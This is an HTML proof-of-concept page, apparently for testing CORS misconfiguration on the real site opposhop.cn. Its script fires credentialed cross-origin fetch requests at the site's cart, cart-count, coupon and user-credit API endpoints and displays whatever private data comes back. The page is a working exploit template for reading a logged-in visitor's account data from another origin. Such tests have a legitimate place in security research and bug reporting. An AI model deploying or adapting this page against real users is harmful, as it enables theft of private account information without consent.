<!DOCTYPE html>
<html>

<head>
<meta charset="UTF-8">

<script>

const endpoints = {
cart: "https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
count: "https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
coupon: "https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
credit: "https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit"
}

function handleCorsRequest(type){

for (let name in endpoints){

fetch(endpoints[name],{

method: "GET",

mode: "cors",

credentials: type === "withCredentials" ? "include" : "omit",

headers:{
"Accept":"*/*",
"Accept-Language":"en-US,en;q=0.9"
}

})

.then(res => res.text())

.then(data => {

document.getElementById(`message-${type}`).textContent +=
"\n\nEndpoint: " + name +
"\nStatus: SUCCESS\nResponse:\n" + data + "\n"

})

.catch(error => {

document.getElementById(`message-${type}`).textContent +=
"\n\nEndpoint: " + name +
"\nStatus: FAILED\nError: " + error.message + "\n"

})

}

}

</script>

</head>

<body>

<h3>CORS Test</h3>

<button onclick="handleCorsRequest('noCredentials')">
Cross-origin request Without Credentials
</button>

<button onclick="handleCorsRequest('withCredentials')">
Cross-origin request With Credentials
</button>

<h3>Results</h3>

<pre id="message-noCredentials"></pre>

<pre id="message-withCredentials"></pre>

</body>

</html>
